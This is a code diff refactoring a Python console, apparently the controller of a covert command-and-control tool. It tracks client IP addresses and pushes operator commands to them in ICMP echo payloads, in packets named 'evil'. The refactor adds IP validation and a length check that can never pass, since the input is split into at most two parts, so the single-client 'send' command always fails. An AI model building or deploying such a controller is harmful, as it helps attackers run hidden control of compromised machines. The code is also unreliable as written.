@@ -13,34 +13,37 @@ def print_help():
     print("\tkill                     Stops server")
     print("\thelp                     Prints this")
 
-def main():
-    clients = dict()
-    id = 0
-    while(True):
-        command = input(">> ")
-        arguments = command.split(" ", 1)
-        if arguments[0] == "":
-            continue
+# Add clients to the dictionary of clients, the IP from arguments, and the id
+def addclient(clients, arguments, id):
+    clients[id] = arguments[1] 
+    if DEBUG: print(f"[DEBUG] Client {id} added at {clients.get(id)}") 
 
-        elif arguments[0] == "addclient":
-            clients[id] = arguments[1] 
-            if DEBUG: print(f"[DEBUG] Client {id} added at {clients.get(id)}") 
-            id += 1
+# Show all clients within the client dictionary 
+def showclients(clients):
+    for client in clients:
+        print(f"Client {client} at {clients.get(client)}")
 
-        elif arguments[0] == "showclients":
-            for client in clients:
-                print(f"Client {client} at {clients.get(client)}")
+# Remove the client by client ID
+def removeclient(arguments, clients):
+    if len(arguments)<2: 
+        print("[ERROR] Specify client by ID")
+    else:
+        if DEBUG: print(f"[DEBUG] Client {arguments[1]} removed from {clients.get(int(arguments[1]))}") 
+        clients.pop(int(arguments[1]))
 
-        elif arguments[0] == "removeclient":
-            if len(arguments)<2: print("Specify client by ID"); continue
-            if DEBUG: print(f"[DEBUG] Client {arguments[1]} removed from {clients.get(int(arguments[1]))}") 
-            clients.pop(int(arguments[1]))
-        
-        elif arguments[0] == "removeallclients":
-            clients.clear()
-            if DEBUG: print(f"[DEBUG] All clients removed")
+# Remove all clients within the client dictionary
+def removeallclients(clients):
+    clients.clear()
+    if DEBUG: print(f"[DEBUG] All clients removed")
 
-        elif arguments[0] == "send":
+# Send command to client by ID via ICMP data
+def send_command(arguments, clients):
+    if len(arguments)<2: 
+        print("[ERROR] Specify client by ID and message")
+    else:
+        if len(arguments)<3: 
+            print("[ERROR] Specify message to send to client")
+        else:
             clientcommand = arguments[1] 
             clienttokens = clientcommand.split(" ", 1)
             if clients.get(int(clienttokens[0])) != None:
@@ -50,18 +53,55 @@ def main():
             else:
                 print(f"[ERROR] No client at ID {clienttokens[0]}")
 
-        elif arguments[0] == "sendtoall":
-            for client in clients:
-                evil = IP(dst=clients.get(client))/ICMP(type=8)/(arguments[1])
-                if DEBUG: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)}")
-                send(evil)
+def sendtoall(arguments, clients):
+    for client in clients:
+        evil = IP(dst=clients.get(client))/ICMP(type=8)/(arguments[1])
+        if DEBUG: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)}")
+        send(evil)
 
+def valid_IP(arguments):
+    a = arguments[1].split('.')
+    if len(a) != 4:
+        return False
+    for x in a:
+        if not x.isdigit():
+            return False
+        i = int(x)
+        if i < 0 or i > 255:
+            return False
+    return True
+
+def main():
+    clients = dict()
+    id = 0
+    while(True):
+        command = input(">> ")
+        arguments = command.split(" ", 1)
+        if arguments[0] == "":
+            continue
+        elif arguments[0] == "addclient":
+            if len(arguments)<2: 
+                print("[ERROR] Missing client IP field")
+                continue
+            if valid_IP(arguments): 
+                addclient(clients, arguments, id)
+                id += 1
+            else:
+                print("[ERROR] Invalid IP Address")
+        elif arguments[0] == "showclients":
+            showclients(clients)
+        elif arguments[0] == "removeclient":
+            removeclient(arguments, clients)
+        elif arguments[0] == "removeallclients":
+            removeallclients(clients)
+        elif arguments[0] == "send":
+            send_command(arguments, clients)
+        elif arguments[0] == "sendtoall":
+            sendtoall(arguments, clients)
         elif arguments[0] == "kill":
             break
-
         elif arguments[0] == "help":
             print_help()
-
         else:
             print("Invalid option, use \"help\" for available commands")
 
